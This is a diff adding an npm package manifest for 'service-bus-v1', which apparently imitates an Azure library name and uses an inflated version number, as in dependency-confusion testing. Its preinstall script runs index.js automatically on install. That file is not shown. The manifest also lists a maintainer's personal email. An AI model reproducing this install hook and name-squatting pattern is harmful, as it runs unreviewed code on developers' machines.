@@ -1,0 +1,39 @@
+{
+    "name": "service-bus-v1",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "service-bus-v1@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-Clw0obBBbQJANButv43I8QiGJqBoE+ra/8LKdvJpwke9PnZmjUEjN+gJCYi4HTbjljVl6w1UDEoE77Np15xL/Q==",
+        "shasum": "de5ae373329fd45fe9f22bda8642e1e58cdde3f0",
+        "tarball": "https://registry.npmjs.org/service-bus-v1/-/service-bus-v1-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3578,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoRCiCRA9TVsSAnZWagAAMssP/1VcGobaBJ69tMJMpJ0b\ns8/R50pBs7RL0N0CT9jdL+/MqyrXYYy5tgbROcvHAW1yZ1fvzkKszHJ69HBu\noCGPxjH+7tYZy3ANbR+L8mk6JSwu4EL5asgsMLoFJ76aZPX36rp7LvaY5P1H\nW53/Fi+U3FW1mpPnBiwKHMwhehhrYHt+hiw9aTUML6L2o0NTDeRt0m6ykWHT\nLK4GFHBjreqflypYi+Fu4rYVYLBtMJXWwevKH4r+DyEKjt8LnSZ425UxVmfF\nuKl69FUeBJvMI2K9C/ZxIMtbL2YiJlzo6Q0ChG+rmohMo11EEO/eZiN4OoqY\na15jGpB+7tR21+asISNJkC3bpONT76EklJ4E2K4rumUHTHaLt99k0/HZLM8c\nth28Yp2cDZcrR0TOIVu051PL+H63UDZEDhxwBKJ0yUj+/8noYR3nEueNYsHr\n/w38M7IQy4/WW+JqotrqcZJOkTdQaZ0XuIdJg8qlE3FCFswZ8Eom63HVrn7K\nsZS/3J9DV5tM4clPsfj7bguiVCU3VsyFsr7jFPY0Z4ATH40hkO3RG2lXGriF\n4MPSilYwhlupWwpIoXuibvqJlwYZFXSxfhc5vrTpZyZjKfZT2rAWCJp1V99v\n6TraE+hjRD2BseXm4cuJuLa0r4Z7qGERls0aAyhYEWQ85J2KcOhHX+vcHXMX\nG+R/\r\n=TuaH\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/service-bus-v1_99.10.9_1637945505882_0.7957069676957294"
+    },
+    "_hasShrinkwrap": false
+}
